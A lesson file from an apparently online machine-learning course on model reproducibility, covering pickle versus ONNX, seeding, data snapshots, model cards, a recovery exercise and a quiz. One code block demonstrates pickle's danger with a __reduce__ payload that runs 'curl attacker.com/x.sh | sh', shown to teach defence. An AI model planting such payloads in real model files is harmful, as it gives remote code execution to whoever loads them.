/* ============================================================================
   LESSON 15.6 — Model Artifacts and Reproducibility
   ========================================================================= */
EC.receiveLesson({
  id: "15.6",

  lede: "A model is not a `.pkl` file. **It is a function of code, data, library versions, hyperparameters and random seeds** — and reproducing a result six months later means having recorded all five, because any one of them will have moved. Teams discover which one they forgot at the moment they most need the model to be rebuildable.",

  objectives: [
    "Serialise a model in a format matching how it will be used",
    "Explain why pickle is a security and compatibility liability",
    "Version data and code together, so a result is reconstructable",
    "Set seeds properly, and know what seeds cannot fix",
    "Record enough metadata to answer \"what produced this number?\""
  ],

  prerequisites: ["14.7", "15.5"],

  blocks: [

    { t: "h2", n: "01", text: "What a model actually is", id: "what" },

    {"kind": "layers", "title": "What a trained model actually is", "caption": "A model artefact is the learned parameters plus the code that interprets them plus the preprocessing that produced its inputs. Save and version all three together, or the loaded model silently disagrees with training.", "items": [{"label": "the parameters", "sub": "weights, trees, coefficients", "tone": "accent"}, {"label": "the preprocessing", "sub": "scaler statistics, vocabularies, encoders", "tone": "warn"}, {"label": "the code version", "sub": "library versions, feature code — pinned", "tone": "good"}, {"label": "the data version and seed", "sub": "what it was trained on", "tone": "violet"}], "t": "diagram", "id": "dg-15_6-01-0"},

    { t: "viz",
      title: "Five inputs, and every one of them drifts",
      caption: "Recording the model file records one of the five. The other four move on their own schedules — a library upgrade, a backfill, a refactor, an unseeded shuffle — and each moves the result.",
      svg: `<svg viewBox="0 0 900 270" role="img" aria-label="Five inputs that determine a model artefact">
  <rect x="330" y="196" width="240" height="52" rx="9" style="fill:var(--surface-2);stroke:var(--accent)"/>
  <text x="450" y="220" text-anchor="middle" class="s-label" style="fill:var(--accent)">the model</text>
  <text x="450" y="240" text-anchor="middle" class="s-sub">a specific set of numbers</text>

  <g class="s-sub">
    <rect x="20" y="30" width="160" height="66" rx="8" style="fill:var(--surface);stroke:var(--t-blue)"/>
    <text x="100" y="54" text-anchor="middle" style="fill:var(--t-blue)">CODE</text>
    <text x="100" y="76" text-anchor="middle" style="fill:var(--ink-3)">a commit sha</text>

    <rect x="196" y="30" width="160" height="66" rx="8" style="fill:var(--surface);stroke:var(--t-green)"/>
    <text x="276" y="54" text-anchor="middle" style="fill:var(--t-green)">DATA</text>
    <text x="276" y="76" text-anchor="middle" style="fill:var(--ink-3)">a snapshot + checksum</text>

    <rect x="372" y="30" width="160" height="66" rx="8" style="fill:var(--surface);stroke:var(--t-violet)"/>
    <text x="452" y="54" text-anchor="middle" style="fill:var(--t-violet)">LIBRARIES</text>
    <text x="452" y="76" text-anchor="middle" style="fill:var(--ink-3)">a lockfile</text>

    <rect x="548" y="30" width="160" height="66" rx="8" style="fill:var(--surface);stroke:var(--t-amber)"/>
    <text x="628" y="54" text-anchor="middle" style="fill:var(--t-amber)">PARAMETERS</text>
    <text x="628" y="76" text-anchor="middle" style="fill:var(--ink-3)">the search result</text>

    <rect x="724" y="30" width="156" height="66" rx="8" style="fill:var(--surface);stroke:var(--t-pink)"/>
    <text x="802" y="54" text-anchor="middle" style="fill:var(--t-pink)">RANDOMNESS</text>
    <text x="802" y="76" text-anchor="middle" style="fill:var(--ink-3)">every seed</text>
  </g>

  <path d="M100 96 L420 192" style="stroke:var(--border-strong);opacity:.5" fill="none"/>
  <path d="M276 96 L435 192" style="stroke:var(--border-strong);opacity:.5" fill="none"/>
  <path d="M452 96 L452 192" style="stroke:var(--border-strong);opacity:.5" fill="none"/>
  <path d="M628 96 L470 192" style="stroke:var(--border-strong);opacity:.5" fill="none"/>
  <path d="M802 96 L482 192" style="stroke:var(--border-strong);opacity:.5" fill="none"/>

  <text x="20" y="148" class="s-sub" style="fill:var(--crit)">Saving the .pkl records the OUTPUT. Reproducing it requires the five INPUTS.</text>
  <text x="20" y="172" class="s-sub" style="fill:var(--ink-3)">"We have the model file" answers a different question from "we can rebuild it".</text>
</svg>`
    },

    { t: "h2", n: "02", text: "Serialisation", id: "serialisation" },

    { t: "table",
      head: ["Format", "Portable?", "Safe to load?", "Use for"],
      rows: [
        ["`pickle` / `joblib`", "**No** — needs the same classes and versions", "**No** — arbitrary code execution", "Your own models, your own infrastructure"],
        ["ONNX", "**Yes** — any runtime, any language", "**Yes** — a computation graph", "**Serving, and crossing language boundaries**"],
        ["PMML", "Yes", "Yes", "Legacy enterprise interoperability"],
        ["`safetensors`", "Yes (weights only)", "**Yes**", "Deep-learning weights"],
        ["Plain parameters (JSON)", "Yes", "Yes", "**Linear models — write the coefficients**"]
      ],
      caption: "**A linear model is a vector of coefficients and an intercept.** Serialising it as JSON makes it inspectable, diffable, loadable from any language, and immune to both of pickle's problems."
    },

    { t: "code", lang: "python", title: "why pickle is a liability", code: `
# 1. IT EXECUTES CODE ON LOAD. Not a bug -- the format's design.
class Exploit:
    def __reduce__(self):
        # Whatever this returns is CALLED during unpickling.
        return (os.system, ("curl attacker.com/x.sh | sh",))

pickle.dumps(Exploit())      # looks like an ordinary model file

# NEVER unpickle a file you did not create. A model downloaded from a
# hub, received from a partner, or restored from an unverified backup
# is untrusted input, and loading it is running it.

# 2. IT BREAKS ON LIBRARY UPGRADES.
#    joblib.load("model.pkl")
#    AttributeError: Can't get attribute '_RemainderColsList' on
#    <module 'sklearn.compose._column_transformer'>
#    -- saved with sklearn 1.2, loaded with 1.4. The class moved.
#
# The pickle stores a REFERENCE to the class, not the class. Any
# rename, move or signature change in the library breaks the load,
# and there is no migration path.

# 3. IT BREAKS ON YOUR OWN REFACTORS.
#    A pipeline containing a custom transformer stores
#    "app.features.RareCategoryGrouper" by name. Move that module and
#    every saved model becomes unloadable.

# THE MINIMUM MITIGATIONS if you must use it:
#   - pin the exact library versions alongside the file
#   - record a checksum, and verify before loading
#   - load only from storage you control, with write access limited
#   - keep the training code, so it can always be rebuilt
`,
      hl: [4, 15, 24],
      caption: "**Point three catches teams by surprise.** A pipeline with a custom transformer is coupled to your module layout, so an ordinary refactor silently invalidates every model artefact you have."
    },

    { t: "code", lang: "python", title: "ONNX, for anything you serve", code: `
from skl2onnx import to_onnx
import onnxruntime as rt

# Export: the pipeline becomes a computation graph, with no reference
# to sklearn, to your classes, or to Python.
onnx_model = to_onnx(
    pipeline,
    X_train[:1].astype(np.float32),     # a sample defines the shape
    target_opset=17,
    options={id(pipeline): {"zipmap": False}},   # plain arrays out
)
Path("model.onnx").write_bytes(onnx_model.SerializeToString())

# Load and run: no sklearn, no pickle, no code execution.
session = rt.InferenceSession("model.onnx",
                              providers=["CPUExecutionProvider"])
preds = session.run(None, {"X": X_test.astype(np.float32)})

# WHAT YOU GAIN
#   - safe loading, and version independence
#   - 2-10x faster inference (graph optimisation, no Python)
#   - the same file runs in C#, Java, Rust, or a browser
#
# WHAT YOU GIVE UP
#   - not every transformer converts; custom ones need a shape
#     calculator and a converter written by hand
#   - float32 only, so verify numerical parity after conversion
#   - the model is now opaque -- no .coef_ to inspect
#
# ALWAYS VERIFY AFTER CONVERTING. Conversion is not always exact.
np.testing.assert_allclose(
    pipeline.predict_proba(X_test)[:, 1],
    session.run(None, {"X": X_test.astype(np.float32)})[1][:, 1],
    rtol=1e-4,
)
`,
      hl: [9, 22, 31],
      caption: "**Verify parity after conversion, always.** float32 truncation and operator differences produce small discrepancies, and \"small\" is a judgement about your problem rather than a property of the tool."
    },

    { t: "h2", n: "03", text: "Seeds", id: "seeds" },

    { t: "ladder",
      title: "Making a training run repeatable",
      rungs: [
        { level: "bad", label: "No seed",
          why: "Every run gives a different model. The reported score is one sample from a distribution you have not measured, and a rerun that scores lower looks like a regression when it is variance.",
          code: `model = RandomForestClassifier()
train_test_split(X, y)
# Two runs, two different models, two different scores. Nothing is
# comparable to anything.` },
        { level: "ok", label: "Seed the obvious places",
          why: "Fixes the split and the model, which is most of it. Misses everything that reads a global generator — a shuffle in a data loader, a hash-based bucketing, a custom sampling function.",
          code: `train_test_split(X, y, random_state=42)
RandomForestClassifier(random_state=42)
# Reproducible, until something else in the pipeline calls
# np.random.rand() without a seed.` },
        { level: "best", label: "Seed everything, and record it",
          why: "One function at the start of training, and the seed is stored with the artefact. A rerun of that exact configuration produces the same model, which is what makes a comparison meaningful.",
          code: `def set_seeds(seed: int = 42) -> None:
    """Every source of randomness in the process."""
    random.seed(seed)
    np.random.seed(seed)
    os.environ["PYTHONHASHSEED"] = str(seed)   # set BEFORE the
                                               # interpreter starts to
                                               # affect set/dict order
    try:
        import torch
        torch.manual_seed(seed)
        torch.cuda.manual_seed_all(seed)
        # Deterministic GPU kernels -- slower, and required for
        # bit-identical results.
        torch.backends.cudnn.deterministic = True
        torch.backends.cudnn.benchmark = False
    except ImportError:
        pass

set_seeds(SEED)
# ...and SEED goes into the artefact metadata, so the run can be
# repeated rather than merely being self-consistent.`,
          note: "**Prefer an explicit generator over the global one**: `rng = np.random.default_rng(seed)` cannot be disturbed by a library that reseeds globally." }
      ]
    },

    { t: "callout", kind: "trap", title: "What seeds cannot fix", body: [
      { t: "code", lang: "python", title: "four sources of irreproducibility", numbered: false, code: `
# 1. FLOATING-POINT SUMMATION ORDER. Parallel reduction sums in
#    whatever order threads finish, and float addition is not
#    associative:
#      (a + b) + c  !=  a + (b + c)
#    n_jobs=-1 gives results that differ in the last digits between
#    runs. Usually irrelevant; occasionally it flips a tie.

# 2. GPU NON-DETERMINISM. Some cuDNN kernels are non-deterministic by
#    design, trading exactness for speed. Forcing determinism can cost
#    20-30% throughput.

# 3. DATA THAT MOVED. The most common cause by far. The seed is fixed,
#    the query is the same, and the TABLE has changed -- late-arriving
#    rows, a backfill, a corrected record. Same code, different data,
#    different model.

# 4. LIBRARY VERSION CHANGES. A default changed in a minor release:
#    sklearn's n_estimators default went 10 -> 100 in 0.22, and any
#    code not specifying it silently trained a different model.

# THE CONSEQUENCE: reproducibility is not "identical bits". It is
# "the same conclusion, from a recorded starting point". Aim for a
# score within the noise band, and MEASURE that band:
scores = [train(seed=s).score for s in range(10)]
print(f"{np.mean(scores):.3f} +/- {np.std(scores):.3f}")
# Now you know whether a 0.004 improvement means anything.`},
      { t: "p", text: "**Measure the seed variance once.** Without it, every comparison between two models is unreadable — you cannot tell an improvement from a different draw." }
    ]},

    { t: "h2", n: "04", text: "Versioning data with code", id: "data-versioning" },

    { t: "code", lang: "python", title: "the metadata that makes a result reconstructable", code: `
@dataclass(frozen=True)
class ModelCard:
    """Everything needed to answer 'what produced this?' and 'can we
    rebuild it?'. Saved alongside the model, and in the registry."""

    model_id: str
    created_at: str

    # CODE -- and whether the tree was clean when it ran.
    git_sha: str
    git_dirty: bool             # a dirty tree means the sha is a lie

    # DATA -- a query is not enough; the table changes.
    data_snapshot_uri: str      # s3://.../snapshots/2026-03-01/
    data_checksum: str          # of the exact file(s) used
    row_count: int
    feature_columns: list[str]  # order matters at inference
    label_column: str
    train_cutoff: str           # for time-based splits

    # ENVIRONMENT
    python_version: str
    library_versions: dict[str, str]   # not just sklearn

    # TRAINING
    hyperparameters: dict
    seed: int

    # RESULTS -- with the variance, so a future comparison is possible
    cv_score_mean: float
    cv_score_std: float
    holdout_score: float

    # PROVENANCE
    trained_by: str
    training_duration_seconds: float


def save_model(pipeline, card: ModelCard, path: Path) -> None:
    path.mkdir(parents=True, exist_ok=True)
    joblib.dump(pipeline, path / "model.joblib")
    (path / "card.json").write_text(json.dumps(asdict(card), indent=2))
    # The checksum is what lets you verify at load time that the file
    # is the one the card describes.
    (path / "model.sha256").write_text(sha256_of(path / "model.joblib"))
`,
      hl: [12, 16, 23, 30],
      caption: "**`git_dirty` is the field people omit and need.** A commit sha recorded from a working tree with uncommitted changes describes code that never existed anywhere."
    },

    { t: "callout", kind: "insight", title: "Snapshot the data, do not re-run the query", body: [
      { t: "code", lang: "python", title: "the difference between the two", numbered: false, code: `
# NOT REPRODUCIBLE. The query is stable; the table is not.
df = pd.read_sql("SELECT * FROM orders WHERE date < '2026-03-01'", db)
# Late-arriving rows, a backfill, or a corrected record all change
# this result without changing a character of the query.

# REPRODUCIBLE. Materialise once, address by content.
snapshot = f"s3://ml-data/orders/{cutoff}/{uuid4().hex[:8]}.parquet"
df.to_parquet(snapshot)
checksum = sha256_of(snapshot)
# The card records the URI and the checksum, so "the data used" is a
# specific object, not a description of one.

# For the same reason, prefer an immutable snapshot to a mutable
# "latest" pointer -- the pointer answers a different question.

# DVC or LakeFS formalise this: content-addressed data, versioned
# alongside the code that consumed it.
#   dvc add data/train.parquet     # a .dvc pointer file is committed
#   git commit -m "training data for model v3"
#   dvc checkout                   # restores the exact bytes`},
      { t: "p", text: "**A query is a description; a snapshot is a fact.** Recording the query tells a future reader what you meant to select, not what you actually got — and on any table with late-arriving data those differ." }
    ]},

    { t: "h2", n: "05", text: "Practice", id: "practice" },

    { t: "exercise",
      kind: "Challenge",
      title: "Reproduce a six-month-old model",
      difficulty: "advanced",
      minutes: 34,
      body: [
        { t: "p", text: "A fraud model is degrading and must be retrained. This is everything that exists." },
        { t: "code", lang: "bash", numbered: false, title: "what you have", code: `
s3://ml-models/fraud/model.pkl          (14 MB, no other files)
Slack, six months ago: "New fraud model deployed, AUC 0.89 🎉"

$ python -c "import joblib; joblib.load('model.pkl')"
AttributeError: Can't get attribute '_RemainderColsList' on
<module 'sklearn.compose._column_transformer'>

$ git log --oneline --all -- 'ml/**'
a3f2b1c  Update fraud model            (6 months ago)
8c9d0e1  Add feature engineering       (7 months ago)
(the training script was deleted 3 months ago in a "cleanup" commit)

$ pip list | grep -i scikit
scikit-learn  1.5.2

Nobody currently on the team trained it.`},
        { t: "p", text: "Say what you can and cannot recover, and give the plan — both to get a working model now, and to make sure this cannot recur." }
      ],
      requirements: [
        "Explain the load error and whether it is recoverable.",
        "List what is recoverable from what you have.",
        "State plainly what is not, and the consequence.",
        "Give the immediate plan.",
        "Give the permanent fix.",
        "Say what the reported 0.89 is worth now."
      ],
      hint: "The git history has more than it appears — a deleted file still exists in the commits before its deletion.",
      solution: {
        lang: "python",
        title: "recovery-plan.md",
        code: `# =========================================================================
# THE LOAD ERROR
# =========================================================================
#
#   AttributeError: Can't get attribute '_RemainderColsList' on
#   <module 'sklearn.compose._column_transformer'>
#
# A pickle stores a REFERENCE to each class, by module path and name,
# not the class itself. Unpickling imports that path and looks the
# name up. _RemainderColsList is an internal helper that
# ColumnTransformer used in sklearn ~1.2-1.3 and that no longer
# exists in 1.5.
#
# IS IT RECOVERABLE? Probably yes, and it is worth the twenty minutes:
#
#   1. Bisect the version. The pickle protocol does not record which
#      sklearn wrote it, so try them:
#
#        for v in 1.0.2 1.1.3 1.2.2 1.3.2 1.4.2; do
#            uv run --isolated --with "scikit-learn==$v" \\
#                python -c "import joblib; m=joblib.load('model.pkl'); \\
#                           print('$v OK', type(m))" 2>/dev/null
#        done
#
#      Do this in an ISOLATED environment. You are executing code
#      from a file whose provenance you cannot fully verify, so it
#      belongs in a container with no credentials and no network.
#
#   2. Once it loads, extract everything before it can be lost again:
#
#        m = joblib.load("model.pkl")
#        print(m.get_params())              # hyperparameters
#        print(m.named_steps)               # pipeline structure
#        print(m[:-1].get_feature_names_out())   # feature names/order
#        print(m.named_steps["clf"].feature_importances_)
#        print(m.named_steps["prep"].transformers_)  # column groups
#
#      Write all of it to JSON immediately. That JSON is now more
#      valuable than the pickle.
#
#   3. Convert to ONNX from that old environment, so the artefact
#      stops depending on sklearn versions at all.
#
# If no version loads it, the model file is lost. It is 14 MB of
# numbers that cannot be interpreted, and no amount of effort
# recovers it.


# =========================================================================
# WHAT IS RECOVERABLE
# =========================================================================
#
# 1. THE TRAINING SCRIPT -- almost certainly. A "cleanup" commit
#    deleted it from HEAD; git keeps every earlier version:
#
#      git log --all --diff-filter=D --name-only -- 'ml/**'
#      # find the deleting commit, then take the parent's copy:
#      git show 8c9d0e1:ml/train_fraud.py > recovered_train.py
#
#    THIS IS THE MOST VALUABLE ARTEFACT AVAILABLE, more than the
#    pickle. It gives the feature list, the split strategy, the
#    hyperparameter grid and possibly the data query.
#
# 2. THE FEATURE CONTRACT -- from the loaded pipeline (step 2 above)
#    or from the recovered script. Column names and their order are
#    what the serving code must supply.
#
# 3. HYPERPARAMETERS -- get_params() on the loaded pipeline.
#
# 4. AN APPROXIMATE LIBRARY VERSION -- from the bisect, plus the
#    commit date cross-referenced against release dates.
#
# 5. THE PREDICTIONS -- if inference outputs were logged, you have a
#    behavioural specification: a set of inputs and the outputs the
#    old model gave. That is enough to VERIFY a replacement even
#    without reproducing it.
#
#
# =========================================================================
# WHAT IS NOT RECOVERABLE
# =========================================================================
#
# 1. THE TRAINING DATA AS IT WAS.
#    Even with the exact query, the fraud table six months later is
#    not the table six months ago: late-arriving labels (fraud is
#    confirmed weeks after the transaction), corrections, deletions,
#    and retention policies removing old rows.
#
#    THIS IS THE ONE THAT CANNOT BE WORKED AROUND. Everything else
#    has a path; this does not.
#
# 2. THE EXACT ENVIRONMENT. No lockfile. Approximate versions can be
#    inferred, transitive dependencies cannot.
#
# 3. THE SEED, unless it is in the recovered script.
#
# 4. THE VALIDATION METHODOLOGY. A Slack message says "AUC 0.89". It
#    does not say cross-validated or holdout, what the split was,
#    what the class balance was, or how many configurations were
#    tried before that number was the best one (Lesson 15.5).
#
#
# =========================================================================
# WHAT IS THE 0.89 WORTH?
# =========================================================================
#
# As a number to compare a new model against: NOTHING. It cannot be
# verified, its methodology is unknown, and the class balance of
# fraud data shifts constantly -- AUC on 0.1% positives and on 0.5%
# positives are not comparable quantities.
#
# It is worth exactly one thing: evidence that a model was considered
# good enough to deploy. Treat it as context, not as a baseline.
#
# THE HONEST BASELINE IS THE MODEL'S CURRENT LIVE PERFORMANCE, which
# you can measure today from logged predictions and realised
# outcomes. Compare the retrained model against THAT.
#
#
# =========================================================================
# IMMEDIATE PLAN
# =========================================================================
#
# DAY 1 -- salvage, in this order
#   1. git show the deleted training script. Commit it back.
#   2. Bisect sklearn versions in an isolated container; load the
#      pickle; dump every extractable attribute to JSON.
#   3. Export to ONNX from that environment, so the current artefact
#      no longer depends on a five-year-old sklearn.
#   4. Measure the CURRENT live performance from prediction logs and
#      realised fraud outcomes. This is the real baseline.
#
# DAY 2-3 -- rebuild properly
#   5. Take a DATED, CHECKSUMMED snapshot of today's training data.
#      Never query the live table again for training.
#   6. Re-run the recovered script against the snapshot, with the
#      current library versions and a recorded seed. Expect a
#      different score -- the data has changed, and that is the
#      point.
#   7. Validate honestly: time-based split, one holdout scored once
#      (Lesson 15.5).
#   8. Compare against the live baseline from step 4, not against
#      0.89.
#
# DAY 4 -- ship with a card
#   9. Save the pipeline, the ONNX export, and a complete model card.
#  10. Shadow-deploy: score both models on live traffic, serve the
#      old one, compare. Promote only on evidence.
#
#
# =========================================================================
# THE PERMANENT FIX
# =========================================================================

@dataclass(frozen=True)
class ModelCard:
    model_id: str
    created_at: str

    # CODE
    git_sha: str
    git_dirty: bool          # a sha from a dirty tree is a lie
    training_script: str     # the PATH, and it must not be deletable

    # DATA -- a snapshot, not a query
    data_snapshot_uri: str
    data_checksum: str
    row_count: int
    positive_rate: float     # so future AUCs are comparable
    feature_columns: list[str]
    train_cutoff: str

    # ENVIRONMENT
    python_version: str
    lockfile_checksum: str
    library_versions: dict[str, str]

    # TRAINING
    hyperparameters: dict
    seed: int
    cv_strategy: str         # "TimeSeriesSplit(n_splits=5, gap=30)"

    # RESULTS -- with variance and methodology, so it MEANS something
    cv_score_mean: float
    cv_score_std: float
    holdout_score: float
    metric: str              # "roc_auc"

    trained_by: str


def train_and_register(cutoff: date) -> ModelCard:
    # 1. SNAPSHOT the data. Immutable, checksummed, dated.
    snapshot_uri = f"s3://ml-data/fraud/{cutoff}/{uuid4().hex[:8]}.parquet"
    df = extract_features(cutoff)
    df.to_parquet(snapshot_uri)

    # 2. Fail loudly on an unclean tree -- a recorded sha must be true.
    assert not git_is_dirty(), "commit before training"

    set_seeds(SEED)
    pipeline, scores = fit_and_evaluate(df)

    card = ModelCard(
        model_id=f"fraud-{cutoff}-{git_sha()[:8]}",
        git_sha=git_sha(),
        git_dirty=False,
        data_snapshot_uri=snapshot_uri,
        data_checksum=sha256_of(snapshot_uri),
        positive_rate=float(df["is_fraud"].mean()),
        lockfile_checksum=sha256_of("uv.lock"),
        library_versions=installed_versions(),
        seed=SEED,
        cv_strategy=repr(CV),
        cv_score_mean=scores.mean,
        cv_score_std=scores.std,
        holdout_score=scores.holdout,
        metric="roc_auc",
        ...
    )

    # 3. Save EVERYTHING together, in one immutable directory.
    save_artifacts(pipeline, card, f"s3://ml-models/fraud/{card.model_id}/")
    #   model.joblib      -- for retraining and inspection
    #   model.onnx        -- for SERVING: version-independent, safe
    #   card.json         -- the five inputs
    #   uv.lock           -- the exact environment
    #   train.py          -- a copy of the training code itself
    return card


# =========================================================================
# THE THREE PRACTICES THAT WOULD HAVE PREVENTED THIS
# =========================================================================
#
# 1. SERVE ONNX, NOT PICKLE. The load error, the security exposure
#    and the refactor coupling all disappear. Keep the joblib for
#    retraining, in an environment pinned by the saved lockfile.
#
# 2. SNAPSHOT THE DATA. This is the only irrecoverable loss here, and
#    it costs a few pounds of object storage per model.
#
# 3. THE MODEL CARD IS PART OF THE ARTEFACT, not a wiki page. A model
#    directory without a card does not deploy -- enforce it in CI.
#
# And one process point: THE TRAINING CODE MUST NOT BE DELETABLE. It
# was removed in a cleanup commit while the model it produced was
# still serving production traffic. A CI check that every deployed
# model_id has a live training script would have blocked that commit.


# =========================================================================
# TESTS
# =========================================================================

def test_a_model_cannot_be_saved_without_a_complete_card():
    with pytest.raises(ValidationError):
        save_artifacts(pipeline, ModelCard(model_id="x"), path)


def test_training_refuses_to_run_with_uncommitted_changes():
    """A recorded git_sha from a dirty tree describes code that never
    existed."""
    with dirty_working_tree():
        with pytest.raises(AssertionError, match="commit before training"):
            train_and_register(date(2026, 3, 1))


def test_the_data_snapshot_is_immutable_and_checksummed():
    card = train_and_register(date(2026, 3, 1))

    assert sha256_of(card.data_snapshot_uri) == card.data_checksum
    with pytest.raises(PermissionError):
        overwrite(card.data_snapshot_uri)


def test_the_onnx_export_matches_the_pipeline():
    """Conversion is not always exact -- verify, every time."""
    np.testing.assert_allclose(
        pipeline.predict_proba(X_test)[:, 1],
        onnx_session.run(None, {"X": X_test.astype(np.float32)})[1][:, 1],
        rtol=1e-4,
    )


def test_retraining_from_the_card_reproduces_the_score():
    """The property that was missing. Rebuild from the recorded
    inputs and land within the measured seed variance."""
    card = load_card("fraud-2026-03-01-a3f2b1c")

    rebuilt = retrain_from_card(card)

    assert abs(rebuilt.cv_score_mean - card.cv_score_mean) < 3 * card.cv_score_std


def test_every_deployed_model_has_a_live_training_script():
    """The cleanup commit that deleted a training script for a model
    still serving traffic."""
    for model_id in deployed_model_ids():
        card = load_card(model_id)
        assert Path(card.training_script).exists(), (
            f"{model_id} is deployed but its training script is gone"
        )`,
        notes: [
          { t: "p", text: "**The deleted training script is the most valuable recoverable artefact, and git still has it.** `git log --all --diff-filter=D` finds the deleting commit, and `git show <parent>:path` retrieves the file — it gives the feature list, the split strategy and probably the data query." },
          { t: "p", text: "**Bisect the sklearn version in an isolated container.** The pickle does not record which version wrote it, and loading a file whose provenance you cannot verify is executing it — so it belongs somewhere with no credentials and no network." },
          { t: "callout", kind: "insight", title: "The data is the only irrecoverable loss", body: [
            { t: "p", text: "Every other gap has a path: the script is in git, the hyperparameters are in the pickle, the versions can be bisected. The training data as it was six months ago cannot be reconstructed — fraud labels arrive weeks late, records get corrected, and retention removes old rows." },
            { t: "p", text: "A dated, checksummed snapshot costs a few pounds of object storage per model and is the single highest-value practice in this lesson." }
          ]},
          { t: "p", text: "**The 0.89 is worth nothing as a baseline.** The methodology is unknown, and AUC at a 0.1% positive rate is not comparable with AUC at 0.5% — fraud class balance shifts constantly. The honest baseline is the model's current live performance, measurable today from logged predictions and realised outcomes." },
          { t: "p", text: "**Serving ONNX would have prevented the load failure, the security exposure and the refactor coupling at once.** Keep the joblib for retraining, in an environment pinned by the lockfile saved beside it." },
          { t: "p", text: "**The training script was deleted while the model it produced was serving production traffic.** A CI check that every deployed `model_id` has a live training script would have blocked that cleanup commit — which is the process failure underneath the technical one." }
        ]
      }
    },

    { t: "callout", kind: "scenario", title: "Real-world scenario", body: [
      { t: "p", text: "A team upgraded scikit-learn from 1.2 to 1.4 as part of routine dependency maintenance. Every saved model failed to load, in every environment, immediately." },
      { t: "p", text: "**They had eleven models in production and no ONNX exports.** Rolling back the library restored service, but it also froze the whole platform on a version with known vulnerabilities — the upgrade was blocked indefinitely by artefacts nobody could migrate." },
      { t: "p", text: "**Converting to ONNX took a week and removed the coupling permanently.** Retraining stayed on pinned versions per model, and serving stopped caring what trained the model at all." },
      { t: "p", text: "**A pickle in your serving path pins your library versions forever.** Every security update becomes a migration project, and the pressure to skip it grows with each model you add." }
    ]}
  ],

  takeaways: [
    "**A model is code, data, libraries, hyperparameters and seeds.** Saving the file records the output, not the inputs.",
    "**Unpickling executes code.** Never load a model file you did not create, and treat downloaded artefacts as untrusted input.",
    "**A pickle stores class references, not classes**, so a library upgrade or your own module refactor silently invalidates every saved model.",
    "**Serve ONNX.** It is safe to load, version-independent, several times faster, and it removes the coupling between serving and training environments.",
    "**Verify numerical parity after converting.** Conversion is not always exact, and float32 truncation is a judgement about your problem.",
    "**A linear model is coefficients and an intercept** — JSON makes it inspectable, diffable and loadable anywhere.",
    "**Seed everything in one function**, including `PYTHONHASHSEED`, and record the seed in the artefact.",
    "**Prefer an explicit generator to the global one**, so a library that reseeds globally cannot disturb you.",
    "**Seeds cannot fix parallel summation order, GPU kernels, changed data or library defaults.** Reproducibility is the same conclusion from a recorded starting point, not identical bits.",
    "**Measure the seed variance once**, or you cannot tell an improvement from a different draw.",
    "**Snapshot the data; do not re-run the query.** A query is a description, a snapshot is a fact, and on any table with late-arriving rows they differ.",
    "**Record `git_dirty`.** A commit sha captured from a dirty working tree describes code that never existed.",
    "**Record the class balance alongside the score**, or a future AUC is not comparable with this one.",
    "**The model card is part of the artefact, not a wiki page** — and a deployed model whose training script has been deleted should fail CI."
  ],

  quiz: {
    title: "Knowledge check",
    questions: [
      {
        stem: "`joblib.load` fails with `Can't get attribute '_RemainderColsList'`. What happened?",
        options: [
          "The file is corrupted",
          "Pickle stores class references by module path, and that internal sklearn class no longer exists in the installed version",
          "The model was saved with a different Python version",
          "joblib requires the original numpy version"
        ],
        answer: 1,
        why: "Unpickling imports the recorded path and looks the name up, so any rename, move or removal in the library breaks the load with no migration path. The same applies to your own custom transformers — moving the module that defines one invalidates every saved pipeline containing it."
      },
      {
        stem: "Why is pickle unsuitable for models received from outside your team?",
        options: [
          "It produces larger files than ONNX",
          "Unpickling executes arbitrary code by design, so loading an untrusted file is running it",
          "It cannot represent scikit-learn pipelines",
          "It is slower to deserialise"
        ],
        answer: 1,
        why: "`__reduce__` returns a callable and its arguments, which unpickling invokes — that is the format's design, not a flaw to be patched. A model downloaded from a hub or restored from an unverified backup is untrusted input; ONNX is a computation graph with no code execution."
      },
      {
        stem: "You set every seed and retrain six months later. The score differs. What is the most likely cause?",
        options: [
          "A seed was missed somewhere",
          "The training data changed — late-arriving rows, corrections and retention all alter what the same query returns",
          "Floating-point non-determinism",
          "The hyperparameters were not recorded"
        ],
        answer: 1,
        why: "This is the failure a snapshot exists to prevent. A query is a description of what you meant to select; on any table with late-arriving data it returns something different each time it runs. Materialising once, with a checksum, makes \"the data used\" a specific object."
      },
      {
        stem: "A Slack message records \"AUC 0.89\" from six months ago. What is it worth as a baseline?",
        options: [
          "It is the target the retrained model must beat",
          "Very little — the methodology is unknown and class balance shifts, so it is not comparable; the honest baseline is current live performance",
          "It is valid provided the same metric is used",
          "It can be adjusted for drift and reused"
        ],
        answer: 1,
        why: "AUC at a 0.1% positive rate and at 0.5% are not the same quantity, and the message says nothing about the split, the number of configurations tried, or whether it was cross-validated. Live performance measured from logged predictions and realised outcomes is a number you can actually defend."
      }
    ]
  },

  interview: {
    title: "Interview lens",
    sub: "Answer out loud before opening",
    questions: [
      {
        level: "advanced",
        q: "How do you make a model reproducible?",
        strong: "Record all five inputs: the commit sha, a checksummed data snapshot, a lockfile, the hyperparameters and the seed. The model file is the output, and saving it answers a different question from being able to rebuild it.",
        answer: [
          { t: "p", text: "Framing it as five inputs rather than \"save the pickle and pin versions\" shows you have been asked to rebuild something and failed." },
          { t: "p", text: "The snapshot-versus-query distinction is the substance, and the data is the one loss with no recovery path." },
          { t: "p", text: "Acknowledging that reproducibility means the same conclusion rather than identical bits keeps the answer honest about parallelism and GPUs." }
        ]
      },
      {
        level: "advanced",
        q: "Would you ship a pickled model to production?",
        strong: "Not into the serving path. Unpickling executes code and couples serving to exact library versions and to my own module layout — ONNX for serving, joblib kept for retraining in a pinned environment.",
        answer: [
          { t: "p", text: "The library-coupling argument lands harder than the security one for most teams: every security upgrade becomes a migration project." },
          { t: "p", text: "Mentioning that a custom transformer couples the artefact to your module paths shows you have hit it during a refactor." },
          { t: "p", text: "Insisting on verifying numerical parity after conversion demonstrates you have actually done it rather than read about it." }
        ]
      },
      {
        level: "core",
        q: "What goes in a model card?",
        strong: "Enough to answer \"what produced this?\" and \"can we rebuild it?\" — commit sha and whether the tree was clean, data snapshot URI and checksum, lockfile, hyperparameters, seed, and the score with its variance and methodology.",
        answer: [
          { t: "p", text: "`git_dirty` is a small field that shows real experience: a sha from a dirty tree describes code that never existed." },
          { t: "p", text: "Recording the score's variance and the class balance is what makes a future comparison possible at all." },
          { t: "p", text: "Saying the card is part of the artefact and enforced in CI, rather than a wiki page, is the difference between a policy and a practice." }
        ]
      }
    ]
  }
});
